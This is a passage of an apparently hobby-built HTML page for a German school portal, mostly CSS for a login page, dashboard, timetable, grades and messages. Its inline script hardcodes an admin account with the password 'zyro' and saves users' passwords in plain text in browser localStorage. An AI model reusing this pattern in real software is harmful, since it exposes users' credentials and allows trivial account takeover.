    input[type="password"]:focus,
    input[type="email"]:focus,
    textarea:focus {
        transform: translateY(-2px);
        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
    }

    /* Notification Badge Animation */
    @keyframes pulse {
        0% { transform: scale(0.95); opacity: 0.5; }
        50% { transform: scale(1); opacity: 1; }
        100% { transform: scale(0.95); opacity: 0.5; }
    }

    .notification-badge {
        animation: pulse 2s infinite;
    }

    /* Grade Animation */
    .grade {
        transition: all 0.3s ease;
    }

    .grade:hover {
        transform: scale(1.2) rotate(10deg);
    }
    
    /* Bestehende Stile beibehalten... */
    * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
    }
    
    body {
        font-family: 'Inter', sans-serif;
        color: rgb(var(--foreground-rgb));
        background: var(--gray-50);
        min-height: 100vh;
    }
    
    /* Login-Seite Stile */
    .login-page {
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        background: url('hintergrund.jfif') no-repeat center center; /* Hintergrundbild mit .jfif-Endung */
        background-size: cover; /* Bild so skalieren, dass es den gesamten Bereich abdeckt */
        padding: 1rem;
        position: relative;
        overflow: hidden;
    }
    
    .login-page video {
        display: none; /* Video ausblenden */
    }
    
    .login-container {
        background-color: rgba(255, 255, 255, 0.5); /* 50% durchsichtig */
        backdrop-filter: blur(5px); /* Unschärfeeffekt für bessere Lesbarkeit */
            -webkit-backdrop-filter: blur(5px); /* Für Safari */
            border-radius: 1rem;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
            overflow: hidden;
            max-width: 64rem;
            width: 100%;
            display: flex;
            flex-direction: column;
            position: relative;
            z-index: 1;
        }
        
        @media (min-width: 768px) {
            .login-container {
                flex-direction: row;
            }
        }
        
        .login-sidebar {
            background-color: rgba(79, 70, 229, 0.8); /* Leicht transparenter Hintergrund für die Sidebar */
            padding: 3rem;
            color: white;
            display: none;
        }
        
        @media (min-width: 768px) {
            .login-sidebar {
                display: flex;
                flex-direction: column;
                justify-content: center;
                width: 50%;
            }
        }
        
        .login-sidebar h1 {
            font-size: 2.25rem;
            font-weight: bold;
            margin-bottom: 1.5rem;
        }
        
        .login-sidebar p {
            font-size: 1.25rem;
            margin-bottom: 2rem;
        }
        
        .features {
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }
        
        .feature {
            display: flex;
            align-items: center;
        }
        
        .feature-icon {
            background-color: rgba(255, 255, 255, 0.2);
            padding: 0.5rem;
            border-radius: 9999px;
            margin-right: 1rem;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .login-content {
            padding: 3rem;
        }
        
        @media (min-width: 768px) {
            .login-content {
                width: 50%;
            }
        }
        
        .login-content h2 {
            font-size: 1.875rem;
            font-weight: bold;
            color: var(--primary-600);
            margin-bottom: 2rem;
            text-align: center;
        }
        
        @media (min-width: 768px) {
            .login-content h2 {
                text-align: left;
            }
        }
        
        .form-group {
            margin-bottom: 1.5rem;
        }
        
        label {
            display: block;
            font-size: 0.875rem;
            font-weight: 500;
            color: var(--gray-700);
            margin-bottom: 0.25rem;
        }
        
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 0.75rem 1rem;
            border-radius: 0.5rem;
            border: 1px solid var(--gray-300);
            outline: none;
        }
        
        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            box-shadow: 0 0 0 2px var(--primary-500);
        }
        
        .form-footer {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 1.5rem;
        }
        
        .remember-me {
            display: flex;
            align-items: center;
        }
        
        .remember-me input {
            height: 1rem;
            width: 1rem;
            color: var(--primary-600);
            border-color: var(--gray-300);
            border-radius: 0.25rem;
        }
        
        .remember-me label {
            margin-left: 0.5rem;
            display: inline;
        }
        
        .forgot-password {
            font-size: 0.875rem;
            font-weight: 500;
            color: var(--primary-600);
            text-decoration: none;
        }
        
        .forgot-password:hover {
            color: var(--primary-500);
        }
        
        button {
            width: 100%;
            display: flex;
            justify-content: center;
            padding: 0.75rem 1rem;
            border: 1px solid transparent;
            border-radius: 0.5rem;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
            font-size: 0.875rem;
            font-weight: 500;
            color: white;
            background-color: var(--primary-600);
            cursor: pointer;
        }
        
        button:hover {
            background-color: var(--primary-700);
        }
        
        button:focus {
            outline: none;
            box-shadow: 0 0 0 2px white, 0 0 0 4px var(--primary-500);
        }
        
        /* Dashboard Stile */
        .dashboard {
            display: none;
            min-height: 100vh;
            background-color: var(--gray-50);
        }
        
        .navigation {
            position: fixed;
            top: 0;
            left: 0;
            bottom: 0;
            width: 16rem;
            background-color: rgba(255, 255, 255, 0.5); /* 50% durchsichtig */
            backdrop-filter: blur(5px); /* Unschärfeeffekt für bessere Lesbarkeit */
            -webkit-backdrop-filter: blur(5px); /* Für Safari */
            border-right: 1px solid var(--gray-200);
            z-index: 10;
            transform: translateX(-100%);
            transition: transform 0.3s ease;
        }
        
        @media (min-width: 768px) {
            .navigation {
                transform: translateX(0);
            }
        }
        
        .navigation.open {
            transform: translateX(0);
        }
        
        .nav-header {
            padding: 1.5rem;
            border-bottom: 1px solid var(--gray-200);
        }
        
        .nav-logo {
            font-size: 1.5rem;
            font-weight: bold;
            color: var(--primary-600);
        }
        
        .nav-links {
            padding: 1.5rem 0;
        }
        
        .nav-link {
            display: flex;
            align-items: center;
            padding: 0.75rem 1.5rem;
            color: var(--gray-600);
            text-decoration: none;
            transition: background-color 0.2s;
        }
        
        .nav-link:hover {
            background-color: var(--gray-50);
        }
        
        .nav-link.active {
            background-color: var(--primary-50);
            color: var(--primary-600);
            border-left: 3px solid var(--primary-600);
        }
        
        .nav-link-icon {
            margin-right: 0.75rem;
        }
        
        .main-content {
            padding-left: 0;
        }
        
        @media (min-width: 768px) {
            .main-content {
                padding-left: 16rem;
            }
        }
        
        .header {
            position: sticky;
            top: 0;
            background-color: white;
            border-bottom: 1px solid var(--gray-200);
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
            height: 4rem;
            display: flex;
            align-items: center;
            padding: 0 1rem;
            z-index: 5;
        }
        
        .menu-button {
            display: block;
            margin-right: 1rem;
            background: none;
            border: none;
            color: var(--gray-600);
            cursor: pointer;
            width: auto;
        }
        
        @media (min-width: 768px) {
            .menu-button {
                display: none;
            }
        }
        
        .page-title {
            font-size: 1.5rem;
            font-weight: 600;
            color: var(--gray-900);
        }
        
        .header-actions {
            margin-left: auto;
            display: flex;
            align-items: center;
        }
        
        .notification-button {
            background: none;
            border: none;
            color: var(--gray-400);
            cursor: pointer;
            width: auto;
            padding: 0.5rem;
            margin-right: 1rem;
        }
        
        .notification-button:hover {
            color: var(--gray-500);
        }
        
        /* Nachrichten-Modal Stile */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 100;
            align-items: center;
            justify-content: center;
            padding: 1rem;
        }
        
        .modal.open {
            display: flex !important;
        }
        
        .modal-content {
            background-color: white;
            border-radius: 0.5rem;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 32rem;
            max-height: 90vh;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
        }
        
        .modal-header {
            padding: 1rem 1.5rem;
            border-bottom: 1px solid var(--gray-200);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .modal-title {
            font-size: 1.25rem;
            font-weight: 600;
            color: var(--gray-900);
        }
        
        .modal-close {
            background: none;
            border: none;
            color: var(--gray-500);
            cursor: pointer;
            width: auto;
            padding: 0.5rem;
        }
        
        .modal-body {
            padding: 1.5rem;
            flex: 1;
        }
        
        .modal-footer {
            padding: 1rem 1.5rem;
            border-top: 1px solid var(--gray-200);
            display: flex;
            justify-content: flex-end;
            gap: 0.75rem;
        }
        
        .recipients-list {
            display: flex;
            flex-direction: column;
            gap: 0.5rem;
            margin-bottom: 1rem;
        }
        
        .recipient {
            display: flex;
            align-items: center;
            padding: 0.5rem;
            border-radius: 0.25rem;
            cursor: pointer;
        }
        
        .recipient:hover {
            background-color: var(--gray-100);
        }
        
        .recipient.selected {
            background-color: var(--primary-50);
        }
        
        .recipient-name {
            font-weight: 500;
            margin-left: 0.75rem;
        }
        
        .recipient-role {
            font-size: 0.75rem;
            color: var(--gray-500);
            margin-left: auto;
        }
        
        .message-form {
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }
        
        .form-label {
            font-weight: 500;
            color: var(--gray-700);
            margin-bottom: 0.25rem;
        }
        
        .message-input {
            width: 100%;
            border: 1px solid var(--gray-300);
            border-radius: 0.375rem;
            padding: 0.75rem;
            min-height: 8rem;
            resize: vertical;
        }
        
        .message-input:focus {
            outline: none;
            border-color: var(--primary-500);
            box-shadow: 0 0 0 2px var(--primary-100);
        }
        
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            padding: 0.5rem 1rem;
            border-radius: 0.375rem;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .btn-secondary {
            background-color: white;
            color: var(--gray-700);
            border: 1px solid var(--gray-300);
        }
        
        .btn-secondary:hover {
            background-color: var(--gray-50);
        }
        
        .btn-primary {
            background-color: var(--primary-600);
            color: white;
            border: 1px solid transparent;
        }
        
        .btn-primary:hover {
            background-color: var(--primary-700);
        }
        
        .content {
            padding: 1.5rem;
        }
        
        @media (min-width: 640px) {
            .content {
                padding: 1.5rem 2rem;
            }
        }
        
        .card {
            background-color: white;
            border-radius: 0.5rem;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
            padding: 1.5rem;
            margin-bottom: 1.5rem;
        }
        
        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1rem;
        }
        
        .card-title {
            font-size: 1.25rem;
            font-weight: 600;
            color: var(--gray-900);
        }
        
        .grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 1.5rem;
        }
        
        @media (min-width: 1024px) {
            .grid {
                grid-template-columns: 1fr 1fr;
            }
        }
        
        .col-span-full {
            grid-column: 1 / -1;
        }
        
        /* Stundenplan Stile */
        .timetable {
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }
        
        .timetable-day {
            border: 1px solid var(--gray-200);
            border-radius: 0.5rem;
            overflow: hidden;
        }
        
        .day-header {
            background-color: var(--gray-100);
            padding: 0.75rem 1rem;
            font-weight: 600;
            color: var(--gray-700);
            border-bottom: 1px solid var(--gray-200);
        }
        
        .lesson {
            display: flex;
            padding: 0.75rem 1rem;
            border-bottom: 1px solid var(--gray-200);
        }
        
        .lesson:last-child {
            border-bottom: none;
        }
        
        .lesson-time {
            width: 7rem;
            color: var(--gray-500);
            font-size: 0.875rem;
        }
        
        .lesson-content {
            flex: 1;
        }
        
        .lesson-subject {
            font-weight: 500;
            color: var(--gray-900);
        }
        
        .lesson-info {
            font-size: 0.875rem;
            color: var(--gray-500);
        }
        
        /* Noten Stile */
        .grades {
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }
        
        .subject {
            padding: 1rem;
            border: 1px solid var(--gray-200);
            border-radius: 0.5rem;
        }
        
        .subject-name {
            font-weight: 600;
            color: var(--gray-900);
            margin-bottom: 0.5rem;
        }
        
        .subject-grades {
            display: flex;
            gap: 0.5rem;
            margin-bottom: 0.5rem;
        }
        
        .grade {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 2rem;
            height: 2rem;
            border-radius: 50%;
            font-weight: 600;
            color: white;
        }
        
        .grade.excellent {
            background-color: #10b981; /* Grün */
        }
        
        .grade.good {
            background-color: #3b82f6; /* Blau */
        }
        
        .grade.average {
            background-color: #f59e0b; /* Gelb */
        }
        
        .grade.poor {
            background-color: #ef4444; /* Rot */
        }
        
        .subject-average {
            font-size: 0.875rem;
            color: var(--gray-600);
        }
        
        /* Nachrichten Stile */
        .messages {
            display: flex;
            flex-direction: column;
        }
        
        .message {
            padding: 1rem;
            border-bottom: 1px solid var(--gray-200);
            display: grid;
            grid-template-columns: 1fr auto;
            grid-template-areas:
                "sender time"
                "subject subject"
                "preview preview";
            gap: 0.25rem;
        }
        
        .message:last-child {
            border-bottom: none;
        }
        
        .message-sender {
            grid-area: sender;
            font-weight: 600;
            color: var(--gray-900);
        }
        
        .message-time {
            grid-area: time;
            font-size: 0.75rem;
            color: var(--gray-500);
        }
        
        .message-subject {
            grid-area: subject;
            font-weight: 500;
        }
        
        .message-preview {
            grid-area: preview;
            font-size: 0.875rem;
            color: var(--gray-600);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        
        .view-all {
            color: var(--primary-600);
            font-size: 0.875rem;
            font-weight: 500;
            text-decoration: none;
        }
        
        .view-all:hover {
            color: var(--primary-700);
            text-decoration: underline;
        }
        
        /* Benachrichtigungen Dropdown */
        .notifications-dropdown {
            position: absolute;
            top: 100%;
            right: 0;
            width: 320px;
            background-color: white;
            border-radius: 0.5rem;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
            margin-top: 0.5rem;
            z-index: 50;
            max-height: 400px;
            overflow-y: auto;
            display: none;
        }
        
        .notifications-dropdown.open {
            display: block;
        }
        
        .notifications-header {
            padding: 1rem;
            border-bottom: 1px solid var(--gray-200);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .notifications-title {
            font-weight: 600;
            color: var(--gray-900);
        }
        
        .mark-all-read {
            font-size: 0.875rem;
            color: var(--primary-600);
            cursor: pointer;
        }
        
        .notifications-list {
            padding: 0.5rem 0;
        }
        
        .notification-item {
            padding: 0.75rem 1rem;
            border-bottom: 1px solid var(--gray-100);
            cursor: pointer;
            display: flex;
            gap: 0.75rem;
            align-items: flex-start;
        }
        
        .notification-item:last-child {
            border-bottom: none;
        }
        
        .notification-item:hover {
            background-color: var(--gray-50);
        }
        
        .notification-icon {
            background-color: var(--primary-100);
            color: var(--primary-600);
            width: 2rem;
            height: 2rem;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }
        
        .notification-content {
            flex: 1;
        }
        
        .notification-title {
            font-weight: 500;
            color: var(--gray-900);
            margin-bottom: 0.25rem;
            font-size: 0.875rem;
        }
        
        .notification-message {
            color: var(--gray-600);
            font-size: 0.875rem;
            margin-bottom: 0.25rem;
        }
        
        .notification-time {
            color: var(--gray-500);
            font-size: 0.75rem;
        }
        
        .notification-unread {
            position: relative;
        }
        
        .notification-unread::before {
            content: '';
            position: absolute;
            top: 1rem;
            left: 0.5rem;
            width: 0.5rem;
            height: 0.5rem;
            border-radius: 50%;
            background-color: var(--primary-500);
        }
        
        .notification-empty {
            padding: 2rem 1rem;
            text-align: center;
            color: var(--gray-500);
        }
        
        /* Profil Dropdown */
        .profile-container {
            position: relative;
            margin-left: 1rem;
        }
        
        .profile-button {
            display: flex;
            align-items: center;
            cursor: pointer;
            padding: 0.25rem;
            border-radius: 50%;
            border: 2px solid transparent;
            transition: border-color 0.2s;
        }
        
        .profile-button:hover {
            border-color: var(--gray-200);
        }
        
        .profile-image {
            width: 2.5rem;
            height: 2.5rem;
            border-radius: 50%;
            object-fit: cover;
            background-color: var(--primary-100);
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--primary-600);
            font-weight: 600;
            font-size: 1rem;
        }
        
        .profile-dropdown {
            position: absolute;
            top: 100%;
            right: 0;
            width: 250px;
            background-color: white;
            border-radius: 0.5rem;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
            margin-top: 0.5rem;
            z-index: 50;
            display: none;
            overflow: hidden;
        }
        
        .profile-dropdown.open {
            display: block;
        }
        
        .profile-header {
            padding: 1rem;
            border-bottom: 1px solid var(--gray-200);
            text-align: center;
        }
        
        .profile-name {
            font-weight: 600;
            color: var(--gray-900);
            margin-bottom: 0.25rem;
        }
        
        .profile-email {
            font-size: 0.875rem;
            color: var(--gray-600);
        }
        
        .profile-menu {
            padding: 0.5rem 0;
        }
        
        .profile-menu-item {
            padding: 0.75rem 1rem;
            display: flex;
            align-items: center;
            color: var(--gray-700);
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .profile-menu-item:hover {
            background-color: var(--gray-50);
        }
        
        .profile-menu-icon {
            margin-right: 0.75rem;
            width: 1.25rem;
            height: 1.25rem;
            color: var(--gray-500);
        }
        
        .profile-menu-text {
            font-size: 0.875rem;
        }
        
        .profile-menu-divider {
            height: 1px;
            background-color: var(--gray-200);
            margin: 0.5rem 0;
        }
        
        .logout-item {
            color: #ef4444;
        }
        
        .logout-item .profile-menu-icon {
            color: #ef4444;
        }
        
        /* Seiten-Container (Stundenplan, Noten, Nachrichten) */
        .page-container {
            display: none;
            padding: 1.5rem;
        }
        
        .page-container.active {
            display: block;
        }
        
        /* Voller Stundenplan */
        .full-timetable {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 1rem;
            margin-bottom: 2rem;
        }
        
        .time-column {
            display: flex;
            flex-direction: column;
            gap: 0.5rem;
        }
        
        .time-header {
            background-color: var(--primary-600);
            color: white;
            text-align: center;
            padding: 0.75rem;
            border-radius: 0.5rem 0.5rem 0 0;
            font-weight: 600;
        }
        
        .time-slot {
            border: 1px solid var(--gray-200);
            border-radius: 0.5rem;
            padding: 0.75rem;
            display: flex;
            flex-direction: column;
            background-color: white;
        }
        
        .time-slot-empty {
            background-color: var(--gray-50);
            color: var(--gray-400);
            justify-content: center;
            align-items: center;
            min-height: 5rem;
        }
        
        .time-slot-time {
            font-size: 0.75rem;
            color: var(--gray-500);
            margin-bottom: 0.25rem;
        }
        
        .time-slot-subject {
            font-weight: 600;
            margin-bottom: 0.25rem;
        }
        
        .time-slot-info {
            font-size: 0.75rem;
            color: var(--gray-600);
        }
        
        /* Alle Noten */
        .all-grades {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 1.5rem;
        }
        
        .grade-card {
            background-color: white;
            border-radius: 0.5rem;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
            padding: 1.5rem;
        }
        
        .grade-card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1rem;
            padding-bottom: 0.75rem;
            border-bottom: 1px solid var(--gray-200);
        }
        
        .grade-card-title {
            font-size: 1.25rem;
            font-weight: 600;
            color: var(--gray-900);
        }
        
        .grade-card-average {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 2.5rem;
            height: 2.5rem;
            border-radius: 50%;
            font-weight: 600;
            color: white;
        }
        
        .grade-card-content {
            display: flex;
            flex-direction: column;
            gap: 0.75rem;
        }
        
        .grade-entry {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0.5rem 0;
            border-bottom: 1px solid var(--gray-100);
        }
        
        .grade-entry:last-child {
            border-bottom: none;
        }
        
        .grade-entry-title {
            font-weight: 500;
        }
        
        .grade-entry-date {
            font-size: 0.75rem;
            color: var(--gray-500);
        }
        
        /* Alle Nachrichten */
        .messages-container {
            display: flex;
            height: calc(100vh - 11rem);
            background-color: white;
            border-radius: 0.5rem;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }
        
        .messages-sidebar {
            width: 300px;
            border-right: 1px solid var(--gray-200);
            display: flex;
            flex-direction: column;
        }
        
        .messages-search {
            padding: 1rem;
            border-bottom: 1px solid var(--gray-200);
        }
        
        .messages-search-input {
            width: 100%;
            padding: 0.5rem 1rem;
            border-radius: 9999px;
            border: 1px solid var(--gray-300);
            background-color: var(--gray-50);
        }
        
        .messages-search-input:focus {
            outline: none;
            border-color: var(--primary-500);
            background-color: white;
        }
        
        .messages-list {
            flex: 1;
            overflow-y: auto;
        }
        
        .message-preview {
            padding: 1rem;
            border-bottom: 1px solid var(--gray-100);
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .message-preview:hover {
            background-color: var(--gray-50);
        }
        
        .message-preview.active {
            background-color: var(--primary-50);
        }
        
        .message-preview-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 0.25rem;
        }
        
        .message-preview-sender {
            font-weight: 600;
            color: var(--gray-900);
        }
        
        .message-preview-time {
            font-size: 0.75rem;
            color: var(--gray-500);
        }
        
        .message-preview-subject {
            font-weight: 500;
            margin-bottom: 0.25rem;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        
        .message-preview-text {
            font-size: 0.875rem;
            color: var(--gray-600);
            overflow: hidden;
            text-overflow: ellipsis;
            display: -webkit-box;
            -webkit-line-clamp: 2;
            -webkit-box-orient: vertical;
        }
        
        .message-content {
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        
        .message-header {
            padding: 1.5rem;
            border-bottom: 1px solid var(--gray-200);
        }
        
        .message-subject {
            font-size: 1.25rem;
            font-weight: 600;
            margin-bottom: 0.5rem;
        }
        
        .message-meta {
            display: flex;
            gap: 1rem;
            color: var(--gray-600);
            font-size: 0.875rem;
        }
        
        .message-sender {
            font-weight: 500;
        }
        
        .message-body {
            padding: 1.5rem;
            flex: 1;
            overflow-y: auto;
            line-height: 1.6;
        }
        
        .message-reply {
            padding: 1.5rem;
            border-top: 1px solid var(--gray-200);
        }
        
        .message-reply-input {
            width: 100%;
            padding: 1rem;
            border: 1px solid var(--gray-300);
            border-radius: 0.5rem;
            resize: none;
            min-height: 6rem;
        }
        
        .message-reply-input:focus {
            outline: none;
            border-color: var(--primary-500);
        }
        
        .message-actions {
            margin-top: 1rem;
            display: flex;
            justify-content: flex-end;
            gap: 0.5rem;
        }
        
        .login-tabs {
            display: flex;
            margin-bottom: 2rem;
            border-bottom: 1px solid var(--gray-200);
        }
        
        .login-tab {
            padding: 0.75rem 1rem;
            font-weight: 500;
            color: var(--gray-600);
            cursor: pointer;
            border-bottom: 2px solid transparent;
            transition: all 0.2s;
        }
        
        .login-tab.active {
            color: var(--primary-600);
            border-bottom-color: var(--primary-600);
        }
        
        .login-form {
            display: none;
        }
        
        .login-form.active {
            display: block;
        }
        
        /* Schulsuche-Dropdown */
        .school-search-container {
            position: relative;
        }
        
        .school-search-input {
            width: 100%;
            padding: 0.75rem 1rem;
            border-radius: 0.5rem;
            border: 1px solid var(--gray-300);
            outline: none;
        }
        
        .school-search-input:focus {
            border-color: var(--primary-500);
            box-shadow: 0 0 0 2px var(--primary-100);
        }
        
        .school-search-dropdown {
            position: absolute;
            top: 100%;
            left: 0;
            right: 0;
            background-color: white;
            border: 1px solid var(--gray-300);
            border-radius: 0 0 0.5rem 0.5rem;
            max-height: 200px;
            overflow-y: auto;
            z-index: 10;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            display: none;
        }
        
        .school-search-dropdown.open {
            display: block;
        }
        
        .school-item {
            padding: 0.75rem 1rem;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .school-item:hover {
            background-color: var(--gray-100);
        }
        
        .school-name {
            font-weight: 500;
            margin-bottom: 0.25rem;
        }
        
        .school-address {
            font-size: 0.75rem;
            color: var(--gray-600);
        }
        
        .contact-toggle {
            display: flex;
            border-radius: 0.5rem;
            overflow: hidden;
            margin-bottom: 1rem;
            border: 1px solid var(--gray-300);
        }
        
        .contact-option {
            flex: 1;
            text-align: center;
            padding: 0.5rem;
            background-color: white;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .contact-option.active {
            background-color: var(--primary-100);
            color: var(--primary-700);
            font-weight: 500;
        }
        
        /* Stil für mehrstufiges Registrierungsformular */
        .register-steps {
            width: 100%;
        }
        
        .register-step {
            display: none;
        }
        
        .register-step.active {
            display: block;
        }
        
        .form-footer {
            display: flex;
            justify-content: space-between;
            margin-top: 1.5rem;
        }
        
        .form-footer button {
            width: auto;
            min-width: 100px;
        }
        
        .form-footer button:only-child {
            margin-left: auto;
        }
        
        small {
            display: block;
            color: var(--gray-500);
            font-size: 0.75rem;
            margin-top: 0.25rem;
        }

        /* Stil für Social Media Karten */
        .social-card {
            transition: transform 0.2s, box-shadow 0.2s;
            cursor: pointer;
            background: white;
            border-radius: 0.5rem;
            overflow: hidden;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
        }

        .social-card:hover {
            transform: translateY(-4px);
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .social-card-content {
            padding: 1.5rem;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        .social-icon {
            width: 48px;
            height: 48px;
            margin-bottom: 1rem;
            color: var(--primary-600);
        }

        .social-title {
            font-size: 1.5rem;
            font-weight: 600;
            margin-bottom: 0.5rem;
            color: var(--gray-900);
        }

        .social-description {
            color: var(--gray-600);
            margin-bottom: 1rem;
        }

        .social-username {
            padding: 0.5rem 1rem;
            background-color: var(--primary-50);
            color: var(--primary-600);
            border-radius: 9999px;
            font-weight: 500;
        }

        /* Scrollbar-Stil für die Navigation */
        .nav-links::-webkit-scrollbar {
            width: 6px;
        }

        .nav-links::-webkit-scrollbar-track {
            background: var(--gray-100);
            border-radius: 3px;
        }

        .nav-links::-webkit-scrollbar-thumb {
            background: var(--gray-300);
            border-radius: 3px;
            transition: background 0.3s ease;
        }

        .nav-links::-webkit-scrollbar-thumb:hover {
            background: var(--gray-400);
        }

        /* Hover-Effekt für Nav-Links */
        .nav-link {
            position: relative;
            overflow: hidden;
        }

        .nav-link::before {
            content: '';
            position: absolute;
            left: 0;
            top: 0;
            height: 100%;
            width: 0;
            background: var(--primary-100);
            transition: width 0.3s ease;
            z-index: 0;
        }

        .nav-link:hover::before {
            width: 100%;
        }

        .nav-link > * {
            position: relative;
            z-index: 1;
        }

        /* Aktiver Link Stil */
        .nav-link.active {
            background: var(--primary-50);
            color: var(--primary-600);
            font-weight: 500;
        }

        .nav-link.active::before {
            width: 4px;
            background: var(--primary-600);
        }

        /* Icon Animation */
        .nav-link-icon {
            transition: transform 0.3s ease;
        }

        .nav-link:hover .nav-link-icon {
            transform: scale(1.1);
        }
    </style>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="schools.js"></script>
</head>
<body>
    <script>
    // Funktion zum Löschen aller Accounts
    function clearAllAccounts() {
        localStorage.removeItem('loggedInUser');
        // NICHT mehr alle registeredUsers löschen
        
        // Aktualisiere die UI
        const loginBtn = document.querySelector('.login-btn');
        if (loginBtn) {
            loginBtn.textContent = 'Login';
            loginBtn.classList.remove('logged-in');
        }
        // Stelle sicher, dass der Standard-Benutzer existiert
        addDefaultUser();
    }

    // Funktion zum Hinzufügen des Standard-Benutzers
    function addDefaultUser() {
        const defaultUser = {
            username: 'zyro',
            password: 'zyro',
            role: 'admin'
        };
        
        // Hole existierende Benutzer oder initialisiere leeres Array
        let registeredUsers = JSON.parse(localStorage.getItem('registeredUsers') || '[]');
        
        // Prüfen ob der Standard-Benutzer bereits existiert
        if (!registeredUsers.some(u => u.username === defaultUser.username)) {
            registeredUsers.push(defaultUser);
            localStorage.setItem('registeredUsers', JSON.stringify(registeredUsers));
            console.log('Standard-Benutzer hinzugefügt');
        }
    }

    // Beim Laden der Seite NUR den Standard-Benutzer hinzufügen wenn nötig
    document.addEventListener('DOMContentLoaded', function() {
        addDefaultUser(); // Nicht mehr clearAllAccounts() aufrufen
    });

    // Funktion zum Registrieren
    function registerUser() {
        console.log("Registrieren-Button geklickt");
        
        // Prüfen, ob die Nutzungsbedingungen akzeptiert wurden
        const termsCheckbox = document.getElementById('register-terms');
        if (!termsCheckbox || !termsCheckbox.checked) {
            alert('Bitte akzeptiere die Nutzungsbedingungen, um fortzufahren.');
            return;
        }
        
        // Daten aus allen Schritten sammeln
        const fullname = document.getElementById('register-fullname').value;
        const username = document.getElementById('register-username').value;
        const school = document.getElementById('register-school').value;
        const password = document.getElementById('register-password').value;
        
        // Kontaktinformationen je nach gewählter Option
        let contact = '';
        if (document.getElementById('email-option').classList.contains('active')) {
            contact = document.getElementById('register-email').value;
        } else {
            contact = document.getElementById('register-phone').value;
        }
        
        // Überprüfen, ob der Benutzername bereits existiert
        const registeredUsers = getRegisteredUsers();
        if (registeredUsers.some(u => u.username === username)) {
            alert('Dieser Benutzername existiert bereits. Bitte wähle einen anderen.');
            return;
        }
        
        // Neuen Benutzer erstellen
        const newUser = {
            fullname: fullname,
            username: username,
            school: school,
            contact: contact,
            password: password,
            isTeacher: document.getElementById('register-teacher').checked
        };
        
        // Benutzer zur Liste hinzufügen
        registeredUsers.push(newUser);
        localStorage.setItem('registeredUsers', JSON.stringify(registeredUsers));
        
        // Aktiven Benutzer speichern
        localStorage.setItem('zyroUser', JSON.stringify(newUser));
        localStorage.setItem('zyroLoggedIn', 'true');
        
        // Erfolgsmeldung anzeigen
        alert('Registrierung erfolgreich abgeschlossen!');
        
        // Zum Dashboard wechseln
        document.getElementById('login-page').style.display = 'none';
        document.getElementById('dashboard').style.display = 'block';
        
        // Benutzernamen im Profil anzeigen
        const profileName = document.getElementById('profile-name');
        if (profileName) {
            profileName.textContent = newUser.fullname || newUser.username;
        }
        
        // Benutzerinitiale im Profilbild anzeigen
        const profileImage = document.getElementById('profile-image');
        if (profileImage) {
            const initial = (newUser.fullname || newUser.username).charAt(0).toUpperCase();
            profileImage.textContent = initial;
        }
    }
    </script>
    
    <!-- Login-Seite -->
    <div class="login-page" id="login-page">
        <video autoplay muted loop id="background-video">
            <!-- Verschiedene Quelloptionen ausprobieren -->
            <source src="samurai-autumn.mp4" type="video/mp4">
            Dein Browser unterstützt keine Hintergrundvideos.
